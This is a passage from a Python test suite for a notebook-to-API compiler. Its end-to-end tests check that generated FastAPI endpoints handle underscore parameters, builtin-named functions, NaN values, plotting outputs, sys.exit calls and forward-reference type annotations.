assert call("when", {{"ts": "2024-01-02"}}) == "2024-01-02 00:00:00"  # a real Timestamp
assert call("custom", {{"m": {{"a": 1}}}}) == 1
assert call("buffer", {{"b": "abc"}}) == 1
# Types Pydantic *can* model are left exactly as they were: an Enum still
# validates, rather than silently degrading to Any.
assert call("picks", {{}}) == "fast"
assert call("picks", {{"mode": "slow"}}) == "slow"
assert client.post("/picks", json={{"mode": "nope"}}, headers=headers).status_code == 422
assert call("healthy", {{"n": 1}}) == 2
assert client.get("/openapi.json").status_code == 200
print("UNMODELABLE_TYPES_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNMODELABLE_TYPES_E2E_OK" in proc.stdout


def test_jupyter_builtin_prelude_stubs_only_undefined_display_and_get_ipython():
    from backend.compiler import _jupyter_builtin_prelude

    both = _jupyter_builtin_prelude("display(1)\nif get_ipython() is not None:\n    pass\n")
    assert "def display(" in both and "def get_ipython(" in both

    only_display = _jupyter_builtin_prelude("display(1)\n")
    assert "def display(" in only_display and "get_ipython" not in only_display

    # Unused, imported, defined, or shadowed by the notebook itself -> untouched.
    assert _jupyter_builtin_prelude("x = 1\n") == ""
    assert _jupyter_builtin_prelude("from IPython.display import display\ndisplay(1)\n") == ""
    assert _jupyter_builtin_prelude("def display(x):\n    pass\ndisplay(1)\n") == ""
    assert _jupyter_builtin_prelude("get_ipython = lambda: 1\nget_ipython()\n") == ""
    # Unparseable code is skipped.
    assert _jupyter_builtin_prelude("def broken(:\n") == ""


def test_compiler_pipeline_top_level_display_and_get_ipython_no_longer_crash_the_app(tmp_path):
    """Confirmed before this: a notebook calling display(...) or
    get_ipython() at top level raised NameError when the compiled app
    imported its runtime module, taking every endpoint down."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [
                {
                    "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                    "source": (
                        "FACTOR = 3\n"
                        "display(FACTOR)\n"
                        "IN_JUPYTER = get_ipython() is not None\n"
                    ),
                },
                {
                    "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                    "source": (
                        "def scale(x: int) -> int:\n    return x * FACTOR\n\n"
                        "def in_jupyter() -> bool:\n    return IN_JUPYTER\n"
                    ),
                },
            ],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

assert client.post("/scale", json={{"x": 2}}, headers=headers).json() == {{"result": 6}}
# get_ipython() answers "not under IPython", so such guards take their other branch.
assert client.post("/in_jupyter", json={{}}, headers=headers).json() == {{"result": False}}
print("JUPYTER_BUILTINS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "JUPYTER_BUILTINS_E2E_OK" in proc.stdout


def test_distribution_name_for_import_maps_well_known_aliases_when_not_installed(monkeypatch):
    """Confirmed before this: with the package not installed on the compiling
    host, `import sklearn` became "sklearn" in requirements.txt (a deprecated
    stub that makes pip fail) and `import PIL`/`cv2`/`bs4` names that don't
    exist on PyPI -- failing every docker build."""
    from backend import compiler as compiler_module

    monkeypatch.setattr(compiler_module, "_installed_packages_distributions", lambda: {})

    expected = {
        "sklearn": "scikit-learn",
        "PIL": "pillow",
        "cv2": "opencv-python",
        "bs4": "beautifulsoup4",
        "yaml": "PyYAML",
        "skimage": "scikit-image",
        "dotenv": "python-dotenv",
        "IPython": "ipython",
    }
    for import_name, distribution in expected.items():
        assert compiler_module.distribution_name_for_import(import_name) == distribution
    # Names that match their distribution, or are unknown, are unchanged.
    assert compiler_module.distribution_name_for_import("numpy") == "numpy"
    assert compiler_module.distribution_name_for_import("totally_unknown_xyz") == "totally_unknown_xyz"


def test_distribution_name_for_import_prefers_what_is_actually_installed(monkeypatch):
    from backend import compiler as compiler_module

    # The installed metadata is authoritative over the static alias table.
    monkeypatch.setattr(
        compiler_module, "_installed_packages_distributions",
        lambda: {"sklearn": ["scikit-learn-intelex"]},
    )
    assert compiler_module.distribution_name_for_import("sklearn") == "scikit-learn-intelex"


def test_resolve_requirements_writes_real_distribution_names_for_uninstalled_aliases(monkeypatch):
    from backend import compiler as compiler_module

    monkeypatch.setattr(compiler_module, "_installed_packages_distributions", lambda: {})

    lines = compiler_module.resolve_requirements({"sklearn", "PIL", "pandas"})
    names = {line.split("==")[0].split(">=")[0] for line in lines}

    assert {"scikit-learn", "pillow"} <= names
    assert "sklearn" not in names and "PIL" not in names


def test_field_name_prefixes_only_leading_underscore_parameters():
    from backend.generator.api_generator import _field_name

    assert _field_name({"name": "x"}) == "x"
    assert _field_name({"name": "x_"}) == "x_"
    assert _field_name({"name": "_x"}) == "p_x"
    assert _field_name({"name": "__x"}) == "p__x"


def test_compiler_pipeline_leading_underscore_parameters_no_longer_crash_the_app(tmp_path):
    """Confirmed before this: a parameter like `_df` or `__x` made Pydantic
    raise "Fields must not use names with leading underscores" when the
    compiled app was imported -- compile succeeded, then *every* endpoint in
    the notebook was dead."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "def mix(_x: int = 1, __y: int = 2, z: int = 3) -> int:\n"
                    "    return _x * 100 + __y * 10 + z\n\n"
                    "def only_kw(a: int, *, _flag: bool = False) -> int:\n"
                    "    return a + (100 if _flag else 0)\n\n"
                    "def required(_data: list[int]) -> int:\n    return sum(_data)\n\n"
                    "# notebook-to-api: background\n"
                    "def train(_n: int) -> int:\n    return _n * 2\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(path, body):
    return client.post(path, json=body, headers=headers)

# The JSON keys are the parameters' real names.
assert post("/mix", {{"_x": 5, "__y": 6, "z": 7}}).json() == {{"result": 567}}
assert post("/mix", {{}}).json() == {{"result": 123}}
assert post("/only_kw", {{"a": 1, "_flag": True}}).json() == {{"result": 101}}
assert post("/required", {{"_data": [1, 2, 3]}}).json() == {{"result": 6}}
assert post("/required", {{}}).status_code == 422

task_id = post("/train", {{"_n": 4}}).json()["task_id"]
deadline = time.time() + 10
while True:
    task = client.get("/tasks/" + task_id, headers=headers).json()
    if task["status"] != "processing":
        break
    assert time.time() < deadline, "task never finished"
    time.sleep(0.02)
assert task["status"] == "completed" and task["result"] == 8, task

# ... and the published schema uses them too, not the internal attribute names.
schema = client.get("/openapi.json").json()["components"]["schemas"]
assert list(schema["MixRequest"]["properties"]) == ["_x", "__y", "z"], schema["MixRequest"]
print("UNDERSCORE_PARAMS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNDERSCORE_PARAMS_E2E_OK" in proc.stdout


def test_compiler_pipeline_range_pandas_missing_values_and_nan_fields_are_plain_json(tmp_path):
    """Confirmed before this: `return range(n)` was a 500, pd.NaT came back
    as the string "NaT", pd.NA as a junk {"__module__": "pandas"} object, and
    a Decimal('NaN') or a dataclass holding a float NaN crashed response
    serialization."""
    pytest.importorskip("pandas")

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import dataclasses, decimal\n"
                    "import pandas as pd\n"
                    "@dataclasses.dataclass\n"
                    "class Stats:\n    mean: float\n    n: int\n\n"
                    "def counted(n: int):\n    return range(n)\n\n"
                    "def missing(n: int):\n    return {'when': pd.NaT, 'v': pd.NA, 'ok': 1}\n\n"
                    "def stats(n: int):\n    return Stats(float('nan'), n)\n\n"
                    "def decimals(n: int):\n"
                    "    return {'nan': decimal.Decimal('NaN'), 'inf': decimal.Decimal('Infinity'), "
                    "'ok': decimal.Decimal('2.5')}\n\n"
                    "def frame(n: int):\n"
                    "    return pd.DataFrame({'t': [pd.NaT, pd.Timestamp('2024-01-02')], "
                    "'v': pd.array([1, None], dtype='Int64')})\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 3}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("counted") == [0, 1, 2]
assert call("missing") == {{"when": None, "v": None, "ok": 1}}
assert call("stats") == {{"mean": None, "n": 3}}
assert call("decimals") == {{"nan": None, "inf": None, "ok": 2.5}}
assert call("frame") == [{{"t": None, "v": 1}}, {{"t": "2024-01-02T00:00:00", "v": None}}]
print("JSON_SAFE_EXTRAS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "JSON_SAFE_EXTRAS_E2E_OK" in proc.stdout


def test_find_import_time_hazards_reports_only_import_time_failures():
    from backend.compiler import _find_import_time_hazards

    cells = [
        'import pandas as pd\ndf = pd.read_csv("data.csv")\nname = input("who?")\n',
        # Run on demand, never on import -> not hazards.
        'def load():\n    return pd.read_csv("inside.csv")\nclass A:\n    x = open("c.txt")\n'
        'f = lambda: pd.read_csv("lam.csv")\n',
        # A main-guard body never runs on import; its else branch does.
        'if __name__ == "__main__":\n    pd.read_csv("main.csv")\nelse:\n    open("else.txt")\n',
        'import numpy as np\nm = np.load("w.npy")\nwith open("r.json") as fh:\n    d = fh.read()\n'
        'open("out.txt", "w")\npd.read_csv("/abs.csv")\npd.read_csv("http://x/y.csv")\n'
        'for i in range(2):\n    pd.read_excel("loop.xlsx")\n'
        'try:\n    pd.read_parquet(path="p.parquet")\nexcept Exception:\n    pass\n',
        "def broken(:\n",
    ]

    found = [(h["cell"], h["line"], h["kind"], h["call"], h["path"]) for h in _find_import_time_hazards(cells)]

    assert found == [
        (1, 2, "file_read", "pd.read_csv", "data.csv"),
        (1, 3, "input", "input", None),
        (3, 4, "file_read", "open", "else.txt"),
        (4, 2, "file_read", "np.load", "w.npy"),
        (4, 3, "file_read", "open", "r.json"),
        (4, 9, "file_read", "pd.read_excel", "loop.xlsx"),
        (4, 11, "file_read", "pd.read_parquet", "p.parquet"),
    ]
    assert _find_import_time_hazards([]) == []


def test_compiler_pipeline_sys_exit_and_keyboard_interrupt_fail_the_call_instead_of_hanging(tmp_path):
    """Confirmed before this: a notebook function calling sys.exit()/exit() or
    raising SystemExit/KeyboardInterrupt raised a BaseException that no
    `except Exception` caught, and the request (or background task) hung
    instead of ever answering."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import sys\n"
                    "def quits(n: int):\n    sys.exit(3)\n\n"
                    "def bare_exit(n: int):\n    exit()\n\n"
                    "def interrupted(n: int):\n    raise KeyboardInterrupt()\n\n"
                    "async def async_quits(n: int):\n    raise SystemExit('bye')\n\n"
                    "def fine(n: int) -> int:\n    return n + 1\n\n"
                    "# notebook-to-api: background\n"
                    "def train(n: int):\n    sys.exit(1)\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

expected = {{
    "quits": "sys.exit(3)",
    "bare_exit": "sys.exit(None)",
    "interrupted": "KeyboardInterrupt",
    "async_quits": "sys.exit('bye')",
}}
for name, fragment in expected.items():
    response = client.post("/" + name, json={{"n": 1}}, headers=headers)
    assert response.status_code == 500, (name, response.status_code, response.text)
    assert fragment in response.json()["detail"], (name, response.text)

# The app is still alive and answering afterwards.
assert client.post("/fine", json={{"n": 1}}, headers=headers).json() == {{"result": 2}}

task_id = client.post("/train", json={{"n": 1}}, headers=headers).json()["task_id"]
deadline = time.time() + 10
while True:
    task = client.get("/tasks/" + task_id, headers=headers).json()
    if task["status"] != "processing":
        break
    assert time.time() < deadline, "task never left processing"
    time.sleep(0.02)
assert task["status"] == "failed" and "sys.exit(1)" in task["error"], task

print("EXIT_SHIELD_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "EXIT_SHIELD_E2E_OK" in proc.stdout


def test_compiler_pipeline_matplotlib_figures_axes_and_pil_images_come_back_as_png_data_uris(tmp_path):
    """Confirmed before this: returning a matplotlib Figure/Axes or a PIL
    image -- what a plotting notebook function naturally returns -- was a
    500 "not JSON-serializable"."""
    pytest.importorskip("matplotlib")
    pytest.importorskip("PIL")
    pytest.importorskip("pandas")

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import matplotlib\nmatplotlib.use('Agg')\n"
                    "import matplotlib.pyplot as plt\n"
                    "import pandas as pd\n"
                    "from PIL import Image\n"
                    "def chart(n: int):\n"
                    "    fig, ax = plt.subplots()\n    ax.plot(range(n))\n    return fig\n\n"
                    "def frame_plot(n: int):\n"
                    "    return pd.DataFrame({'a': list(range(n))}).plot()\n\n"
                    "def picture(n: int):\n    return Image.new('RGB', (4, 4), 'red')\n\n"
                    "def nested(n: int):\n    return {'img': Image.new('RGB', (2, 2)), 'n': n}\n\n"
                    "def open_figures(n: int) -> int:\n    return len(plt.get_fignums())\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import base64
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}
PREFIX = "data:image/png;base64,"

def call(name):
    response = client.post("/" + name, json={{"n": 3}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

def assert_png(uri):
    assert uri.startswith(PREFIX), uri[:40]
    assert base64.b64decode(uri[len(PREFIX):]).startswith(b"\\x89PNG")

assert_png(call("chart"))
assert_png(call("frame_plot"))
assert_png(call("picture"))
nested = call("nested")
assert_png(nested["img"]) and nested["n"] == 3

# Figures are closed after rendering, so a busy server doesn't leak one per call.
for _ in range(3):
    call("chart")
assert call("open_figures") == 0

print("PNG_RESULTS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=90,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "PNG_RESULTS_E2E_OK" in proc.stdout


def test_arg_annotation_source_infers_unannotated_types_from_the_default():
    from backend.generator.api_generator import _arg_annotation_source

    def arg(**fields):
        return {"name": "x", **fields}

    # An explicit annotation always wins.
    assert _arg_annotation_source(arg(type="List[int]", has_default=True, default=5))[0] == "List[int]"
    # Otherwise the default's literal type decides...
    for default, expected in ((True, "bool"), (3, "int"), (1.5, "float"), ("s", "str"), ([1], "list"), ({"a": 1}, "dict")):
        assert _arg_annotation_source(arg(has_default=True, default=default)) == (expected, set())
    # ... and with nothing to go on, any JSON value is accepted.
    assert _arg_annotation_source(arg()) == ("Any", {"Any"})
    assert _arg_annotation_source(arg(has_default=True, default=None)) == ("Any", {"Any"})
    assert _arg_annotation_source(arg(has_default=True, default="X.Y", default_is_literal=False)) == ("Any", {"Any"})


def test_compiler_pipeline_unannotated_parameters_accept_json_numbers(tmp_path):
    """Confirmed before this: every unannotated parameter was forced to
    `str`, so the most ordinary notebook function -- `def add(a, b)` --
    answered `add(1, 2)` with a 422 "Input should be a valid string"."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "def add(a, b):\n    return a + b\n\n"
                    "def scale(x, factor=2, label='n', verbose=False, extras=None):\n"
                    "    return [x * factor, label, verbose, extras]\n\n"
                    "def typed(x: str, n=3) -> str:\n    return x * n\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(path, body):
    return client.post(path, json=body, headers=headers)

# No annotation and no default: any JSON value.
assert post("/add", {{"a": 1, "b": 2}}).json() == {{"result": 3}}
assert post("/add", {{"a": 1.5, "b": 2}}).json() == {{"result": 3.5}}
assert post("/add", {{"a": "x", "b": "y"}}).json() == {{"result": "xy"}}
assert post("/add", {{"a": 1}}).status_code == 422  # still required

# No annotation: the type follows the default.
assert post("/scale", {{"x": 4}}).json() == {{"result": [8, "n", False, None]}}
assert post("/scale", {{"x": 4, "factor": 3, "verbose": True}}).json() == {{"result": [12, "n", True, None]}}
assert post("/scale", {{"x": 1, "factor": "three"}}).status_code == 422
assert post("/typed", {{"x": "ab"}}).json() == {{"result": "ababab"}}

properties = client.get("/openapi.json").json()["components"]["schemas"]["ScaleRequest"]["properties"]
assert properties["factor"]["type"] == "integer" and properties["factor"]["default"] == 2, properties
assert properties["verbose"]["type"] == "boolean", properties
print("UNANNOTATED_PARAMS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNANNOTATED_PARAMS_E2E_OK" in proc.stdout


def test_annotation_qualifier_leaves_lambda_and_comprehension_variables_alone():
    from backend.generator.api_generator import _resolve_annotation_source

    # Names bound by the lambda/comprehension are not notebook attributes.
    assert _resolve_annotation_source("lambda v: v + OFFSET")[0] == "lambda v: v + notebook_module.OFFSET"
    assert _resolve_annotation_source("[i * K for i in range(3)]")[0] == "[i * notebook_module.K for i in range(3)]"
    assert _resolve_annotation_source("{k: v for k, v in PAIRS}")[0] == "{k: v for k, v in notebook_module.PAIRS}"
    # Outside any inner scope a bare name is still the notebook's.
    assert _resolve_annotation_source("v")[0] == "notebook_module.v"


def test_json_safe_example_reduces_defaults_to_json_values():
    import math

    from backend.generator.api_generator import _json_safe_example

    assert _json_safe_example({"s": {3, 1, 2}, "t": (1, 2), "b": b"ab", "n": float("nan"), "i": math.inf, "ok": 1.5}) == {
        "s": [1, 2, 3], "t": [1, 2], "b": "ab", "n": None, "i": None, "ok": 1.5,
    }
    assert _json_safe_example({"mixed": {1, "a"}})["mixed"] in ([1, "a"], ["a", 1])


def test_compiler_pipeline_non_json_parameter_defaults_no_longer_break_openapi(tmp_path):
    """Confirmed before this: a default of np.nan / float('inf') / bytes / a
    set / a custom object made GET /openapi.json answer 500 (so /docs,
    export-openapi and every generated SDK broke) though calling the
    endpoint worked; and a lambda default had its own parameter rewritten to
    a nonexistent notebook attribute, failing every call."""
    pytest.importorskip("numpy")

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import numpy as np\n"
                    "class Cfg:\n    pass\n"
                    "CFG = Cfg()\n"
                    "def nan_default(x: float = np.nan) -> str:\n    return str(x)\n\n"
                    "def inf_default(x: float = float('inf')) -> str:\n    return str(x)\n\n"
                    "def bytes_default(b: bytes = b'ab') -> int:\n    return len(b)\n\n"
                    "def set_default(s: set = {1, 2}) -> int:\n    return len(s)\n\n"
                    "def object_default(x: int, cfg=CFG) -> int:\n    return x\n\n"
                    "def lambda_default(x: int, cb=lambda v: v * 2) -> int:\n    return cb(x)\n\n"
                    "def comprehension_default(squares=[i * i for i in range(3)]) -> list:\n"
                    "    return squares\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name, body):
    response = client.post("/" + name, json=body, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

# The schema serves, and /docs' own source with it.
response = client.get("/openapi.json")
assert response.status_code == 200, response.text
schemas = response.json()["components"]["schemas"]
assert "Nan_defaultRequest" in schemas

# The real defaults still reach the functions.
assert call("nan_default", {{}}) == "nan"
assert call("inf_default", {{}}) == "inf"
assert call("bytes_default", {{}}) == 2
assert call("set_default", {{}}) == 2
assert call("set_default", {{"s": [1, 2, 3]}}) == 3
assert call("object_default", {{"x": 5}}) == 5
assert call("lambda_default", {{"x": 4}}) == 8
assert call("comprehension_default", {{}}) == [0, 1, 4]

print("NON_JSON_DEFAULTS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "NON_JSON_DEFAULTS_E2E_OK" in proc.stdout


def test_endpoint_python_name_renames_only_builtin_named_handlers():
    from backend.generator.api_generator import _endpoint_python_name

    assert _endpoint_python_name("train_model") == "train_model"
    assert _endpoint_python_name("list") == "_endpoint_list"
    assert _endpoint_python_name("isinstance") == "_endpoint_isinstance"


def test_compiler_pipeline_functions_named_like_builtins_do_not_break_the_app(tmp_path):
    """Confirmed before this: a notebook function named list/int/set/range/
    type/isinstance/getattr was defined under that name at the generated
    app.py's module level, shadowing the builtin for the app's own code --
    every endpoint then answered 500 (not just that one) and /openapi.json
    too."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "def isinstance(x: int = 1) -> int:\n    return 11\n\n"
                    "def list(x: int = 1) -> int:\n    return 12\n\n"
                    "def int(x: str = '1') -> str:\n    return 'int:' + x\n\n"
                    "def type(x: float = 1.0) -> float:\n    return x * 2\n\n"
                    "# notebook-to-api: background\n"
                    "def range(n: float = 1.0) -> float:\n    return n + 1\n\n"
                    "def other(x: float = 1.0) -> float:\n    return x\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(path, body):
    return client.post(path, json=body, headers=headers)

assert post("/isinstance", {{}}).json() == {{"result": 11}}
assert post("/list", {{}}).json() == {{"result": 12}}
assert post("/int", {{"x": "5"}}).json() == {{"result": "int:5"}}
assert post("/type", {{"x": 2.5}}).json() == {{"result": 5.0}}
# Unrelated endpoints and the schema are unaffected.
assert post("/other", {{"x": 3.0}}).json() == {{"result": 3.0}}
assert client.get("/openapi.json").status_code == 200
paths = client.get("/openapi.json").json()["paths"]
assert {{"/isinstance", "/list", "/int", "/type", "/range", "/other"}} <= set(paths)

# A background endpoint with a builtin name works too.
task_id = post("/range", {{"n": 4.0}}).json()["task_id"]
deadline = time.time() + 10
while True:
    task = client.get("/tasks/" + task_id, headers=headers).json()
    if task["status"] != "processing":
        break
    assert time.time() < deadline, "task never finished"
    time.sleep(0.02)
assert task["status"] == "completed" and task["result"] == 5.0, task

print("BUILTIN_NAMES_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "BUILTIN_NAMES_E2E_OK" in proc.stdout


def test_annotation_qualifier_resolves_forward_references_but_not_literal_or_annotated_metadata():
    from backend.generator.api_generator import _resolve_annotation_source

    assert _resolve_annotation_source("'Later'")[0] == "notebook_module.Later"
    assert _resolve_annotation_source("List['Node']")[0] == "List[notebook_module.Node]"
    assert _resolve_annotation_source("Optional['int']")[0] == "Optional[int]"
    # Quoted values inside Literal, and Annotated's metadata, are not types.
    assert _resolve_annotation_source("Literal['a', 'Later']")[0] == "Literal['a', 'Later']"
    assert _resolve_annotation_source("Annotated[int, Field(description='must be Later')]")[0] == (
        "Annotated[int, Field(description='must be Later')]"
    )
    # Unparseable quoted text stays as it was.
    assert _resolve_annotation_source("'not a type!'")[0] == "'not a type!'"


def test_needs_safe_annotation_flags_only_risky_annotations():
    from backend.generator.api_generator import _needs_safe_annotation

    for risky in ("notebook_module.Item", "Iterator[int]", "re.Pattern", "np.float64",
                  "typing.TypedDict", "List[notebook_module.Node]", "Optional[Awaitable[int]]"):
        assert _needs_safe_annotation(risky), risky
    for plain in ("int", "str", "List[float]", "Optional[str]", "Dict[str, Any]", "datetime.date",
                  "pathlib.Path", "Literal['a', 'b']", "Any"):
        assert not _needs_safe_annotation(plain), plain


def test_compiler_pipeline_unmodelable_typing_annotations_and_forward_references_work(tmp_path):
    """Confirmed before this: Iterator[int] and typing.TypedDict crashed the
    whole generated app at import, re.Pattern broke /openapi.json, and a quoted
    forward reference to a class defined later (`x: 'Later'`) failed every call."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import re, typing\n"
                    "from typing import Iterator, List, Literal, Annotated, Optional\n"
                    "from pydantic import BaseModel, Field\n"
                    "class Pt(typing.TypedDict):\n    x: int\n    y: int\n\n"
                    "def stream(it: Iterator[int]) -> int:\n    return 1\n\n"
                    "def matcher(p: re.Pattern) -> int:\n    return 2\n\n"
                    "def points(p: Pt) -> int:\n    return p['x'] + p['y']\n\n"
                    "def later(item: 'Later') -> int:\n    return 4\n\n"
                    "def nested(items: List['Later']) -> int:\n    return len(items)\n\n"
                    "class Later(BaseModel):\n    n: int = 0\n\n"
                    "def mode(m: Literal['a', 'b'] = 'a') -> str:\n    return m\n\n"
                    "def bounded(n: Annotated[int, Field(gt=0, description='positive')] = 1) -> int:\n"
                    "    return n\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(path, body):
    return client.post(path, json=body, headers=headers)

assert client.get("/openapi.json").status_code == 200
assert post("/stream", {{"it": [1, 2]}}).json() == {{"result": 1}}
assert post("/matcher", {{"p": "a+"}}).json() == {{"result": 2}}
assert post("/points", {{"p": {{"x": 1, "y": 2}}}}).json() == {{"result": 3}}
